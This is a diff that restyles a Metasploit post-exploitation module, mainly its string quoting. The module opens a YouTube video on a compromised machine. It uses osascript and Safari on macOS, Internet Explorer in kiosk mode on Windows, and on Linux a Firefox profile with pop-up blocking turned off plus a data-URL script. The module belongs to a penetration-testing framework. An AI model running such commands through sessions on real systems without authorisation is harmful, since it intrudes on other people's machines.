@@ -36,7 +36,7 @@ class MetasploitModule < Msf::Post
               stdapi_sys_process_execute
             ]
           }
-        },
+        }
       )
     )
 
@@ -61,9 +61,9 @@ class MetasploitModule < Msf::Post
   #
   def osx_start_video(_id)
     script = ''
-    script << %Q|osascript -e 'tell application "Safari" to open location "#{youtube_url}"' |
-    script << %Q|-e 'activate application "Safari"' |
-    script << %Q|-e 'tell application "System Events" to key code {59, 55, 3}'|
+    script << %(osascript -e 'tell application "Safari" to open location "#{youtube_url}"' )
+    script << %(-e 'activate application "Safari"' )
+    script << %(-e 'tell application "System Events" to key code {59, 55, 3}')
 
     begin
       cmd_exec(script)
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Post
   # The Windows version uses the "embed" player to make sure IE won't download the SWF as an object
   #
   def win_start_video(_id)
-    iexplore_path = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+    iexplore_path = 'C:\\Program Files\\Internet Explorer\\iexplore.exe'
     begin
       session.sys.process.execute(iexplore_path, "-k #{youtube_url}")
     rescue Rex::Post::Meterpreter::RequestError
@@ -98,17 +98,17 @@ class MetasploitModule < Msf::Post
       profile_name = Rex::Text.rand_text_alpha(8)
       display = get_env('DISPLAY') || ':0'
       vprint_status("Creating profile #{profile_name} using display #{display}")
-      o = cmd_exec(%Q|firefox --display #{display} -CreateProfile "#{profile_name} /tmp/#{profile_name}"|)
+      o = cmd_exec(%(firefox --display #{display} -CreateProfile "#{profile_name} /tmp/#{profile_name}"))
 
       # Add user-defined settings to profile
-      s = %Q|
+      s = %|
       user_pref("dom.disable_open_during_load", false);
       user_pref("browser.shell.checkDefaultBrowser", false);
       |
       write_file("/tmp/#{profile_name}/prefs.js", s)
 
       # Start the video
-      data_js = %Q|"data:text/html,<script>window.open('#{youtube_url}','','width:100000px;height:100000px');</script>"|
+      data_js = %|"data:text/html,<script>window.open('#{youtube_url}','','width:100000px;height:100000px');</script>"|
       joe = "firefox --display #{display} -p #{profile_name} #{data_js} &"
       cmd_exec("/bin/sh -c #{joe.shellescape}")
     rescue EOFError
